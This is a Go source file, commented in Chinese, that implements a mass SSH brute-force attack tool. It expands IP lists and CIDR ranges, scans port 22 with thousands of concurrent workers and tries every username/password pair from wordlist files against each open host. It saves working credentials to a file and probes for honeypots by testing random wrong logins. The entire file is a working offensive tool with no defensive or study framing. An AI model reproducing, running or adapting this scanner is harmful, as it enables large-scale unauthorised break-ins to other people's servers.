package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	port                  = "22"
	timeout               = 1 * time.Second
	ipFilename            = "ip.txt"
	userFile              = "user.txt"
	passFile              = "passwd.txt"
	resultFile            = "success.txt"
	scanWorkers           = 10000
	authWorkers           = 10000
	authWorkersPerIP      = 50
	honeypotTestRounds    = 3
)

func init() {
	flag.Parse()
	rand.Seed(time.Now().UnixNano())
}

func main() {
	users, err := readLines(userFile)
	if err != nil {
		fmt.Println("讀取用戶失敗:", err)
		return
	}
	passwords, err := readLines(passFile)
	if err != nil {
		fmt.Println("讀取密碼失敗:", err)
		return
	}

	ipChan := readIPFile(ipFilename)
	openIPs := make(chan string, 1000)
	success := make(chan string, 1000)

	var scanWg, authWg sync.WaitGroup

	// 啟動掃描工作池
	go func() {
		startScanPool(ipChan, openIPs, &scanWg)
		scanWg.Wait()
		close(openIPs)
	}()

	// 啟動認證工作池
	go func() {
		startAuthPool(openIPs, users, passwords, success, &authWg)
		authWg.Wait()
		close(success)
	}()

	// 處理成功結果
	out, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("無法寫入結果文件:", err)
		return
	}
	defer out.Close()

	for result := range success {
		fmt.Println("[+] 成功登入:", result)
		_, _ = out.WriteString(result + "\n")
	}

	fmt.Println("掃描結束")
}

func startScanPool(ipChan <-chan string, openIPs chan<- string, wg *sync.WaitGroup) {
	for i := 0; i < scanWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range ipChan {
				if isOpen(ip, port) {
					openIPs <- ip
				} else {
					fmt.Printf("[-] %s 無法連接 22 端口\n", ip)
				}
			}
		}()
	}
}

func startAuthPool(openIPs <-chan string, users, passwords []string, success chan<- string, wg *sync.WaitGroup) {
	for i := 0; i < authWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range openIPs {
				if loginSSHConcurrent(ip, users, passwords, success) {
					// 目標IP已處理，繼續下一IP
					continue
				}
			}
		}()
	}
}

// loginSSHConcurrent 對單個 IP 使用多線程嘗試所有帳密組合，
// 第一個成功後取消其餘任務，並進行蜜罐檢測。
func loginSSHConcurrent(ip string, users, passwords []string, success chan<- string) bool {
	type cred struct{ user, pass string }
	tasks := make(chan cred)
	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup
	var successOnce sync.Once
	var found bool

	// 啟動 per-IP 認證工作池
	for i := 0; i < authWorkersPerIP; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case task, ok := <-tasks:
					if !ok {
						return
					}
					// 嘗試 SSH 登錄
					if trySSHLogin(ip, task.user, task.pass) {
						successOnce.Do(func() {
							found = true
							// 蜜罐檢測
							honeypotCount := 0
							for i := 0; i < honeypotTestRounds; i++ {
								fakeUser := users[rand.Intn(len(users))]
								fakePass := passwords[rand.Intn(len(passwords))]
								if fakeUser == task.user && fakePass == task.pass {
									fakePass += "_wrong"
								}
								if trySSHLogin(ip, fakeUser, fakePass) {
									honeypotCount++
									fmt.Printf("[!] %s 測試 %d/\u003d3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
								} else {
									fmt.Printf("[-] %s 測試 %d/\u003d3 錯誤登入被拒 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
								}
							}
							successMsg := fmt.Sprintf("%s@%s 密碼: %s", task.user, ip, task.pass)
							if honeypotCount == honeypotTestRounds {
								successMsg += " [可能為蜜罐：連續3次錯誤帳密皆可登入]"
							}
							fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", ip, task.user, task.pass)
							success <- successMsg
							// 取消其餘嘗試
							cancel()
						})
						return
					} else {
						fmt.Printf("[-] %s 登錄失敗 (%s/%s)\n", ip, task.user, task.pass)
					}
				}
			}
		}()
	}

	// 分配任務
	go func() {
		defer close(tasks)
		for _, u := range users {
			for _, p := range passwords {
				select {
				case <-ctx.Done():
					return
				default:
					tasks <- cred{u, p}
				}
			}
		}
	}()

	wg.Wait()
	cancel()
	return found
}

// trySSHLogin 嘗試單次 SSH 連接並釋放資源
func trySSHLogin(ip, user, pass string) bool {
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}

	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
	if err != nil {
		return false
	}
	defer conn.Close()

	_, _, _, err = ssh.NewClientConn(conn, net.JoinHostPort(ip, port), config)
	if err != nil {
		return false
	}
	return true
}

func isOpen(ip, port string) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func readLines(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	var lines []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func readIPFile(filename string) <-chan string {
	out := make(chan string, 10000)
	go func() {
		defer close(out)
		lines, err := readLines(filename)
		if err != nil {
			fmt.Println("讀取IP文件失敗:", err)
			return
		}
		for _, line := range lines {
			if ip, ipnet, err := net.ParseCIDR(line); err == nil {
				for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
					out <- ip.String()
				}
			} else if ip := net.ParseIP(line); ip != nil {
				out <- ip.String()
			} else {
				fmt.Println("無法解析 IP:", line)
			}
		}
	}()
	return out
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

